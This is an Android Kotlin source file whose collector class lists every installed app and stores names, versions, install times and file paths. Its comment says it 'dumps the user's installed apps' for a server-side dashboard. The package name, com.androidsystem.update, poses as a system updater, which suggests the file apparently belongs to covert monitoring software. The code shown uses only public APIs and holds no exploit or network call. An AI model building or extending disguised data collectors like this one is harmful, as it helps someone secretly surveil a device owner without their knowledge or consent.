package com.androidsystem.update.collector

import android.content.Context
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.os.Build
import com.androidsystem.update.database.DataRepository
import com.androidsystem.update.database.InstalledAppEntity
import dagger.hilt.android.qualifiers.ApplicationContext
import javax.inject.Inject
import javax.inject.Singleton

/**
 * Periodically dumps the user's installed apps (full snapshot, server diffs by
 * packageName). SYSTEM_APPS are flagged so the dashboard can render a
 * dedicated column. Runs every [intervalMs] ms; defaults are tuned to avoid
 * the PackageManager flag races during install/uninstall bursts.
 *
 * Targets no-root Android 14+. Uses only public PackageManager APIs.
 */
@Singleton
class InstalledAppsCollector @Inject constructor(
    @ApplicationContext private val context: Context,
    private val repository: DataRepository
) {

    @Volatile private var running = false

    suspend fun collect() {
        if (running) return
        running = true
        try {
            val pm = context.packageManager
            val apps = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                pm.getInstalledApplications(PackageManager.ApplicationInfoFlags.of(0L))
            } else {
                @Suppress("DEPRECATION")
                pm.getInstalledApplications(0)
            }
            apps.forEach { info ->
                try {
                    val pkgInfo = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        pm.getPackageInfo(
                            info.packageName,
                            PackageManager.PackageInfoFlags.of(0L)
                        )
                    } else {
                        @Suppress("DEPRECATION")
                        pm.getPackageInfo(info.packageName, 0)
                    }
                    repository.upsertInstalledApp(
                        InstalledAppEntity(
                            packageName = info.packageName,
                            appName = pm.getApplicationLabel(info).toString(),
                            versionName = pkgInfo.versionName ?: "",
                            versionCode = pkgInfo.longVersionCode,
                            firstInstallTime = pkgInfo.firstInstallTime,
                            lastUpdateTime = pkgInfo.lastUpdateTime,
                            isSystemApp = (info.flags and ApplicationInfo.FLAG_SYSTEM) != 0
                                && (info.flags and ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) == 0,
                            targetSdk = pkgInfo.applicationInfo?.targetSdkVersion ?: 0,
                            sourceDir = info.sourceDir ?: ""
                        )
                    )
                } catch (_: PackageManager.NameNotFoundException) {
                    // App uninstalled between getInstalledApplications and the per-package query
                } catch (_: Exception) { /* skip bad row */ }
            }
        } finally {
            running = false
        }
    }
}
